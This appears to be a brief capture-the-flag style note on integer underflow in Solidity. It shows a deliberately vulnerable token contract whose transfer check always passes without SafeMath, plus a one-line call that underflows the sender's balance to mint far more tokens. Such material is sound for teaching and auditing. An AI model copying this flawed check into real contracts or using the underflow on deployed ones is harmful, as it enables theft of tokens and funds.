# Integer Under/Overflows

If SafeMath is missing, this means we can make the value of any `unit` variable large or very small

Example vuln code, assume we as the msg.sender start with 20 tokens:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}
```

The transfer function is the vulnerable function that we can trigger an underflow with to obtain wayyyy more tokens:

```javascript
await contract.transfer('anyaddress', 20+1)
```

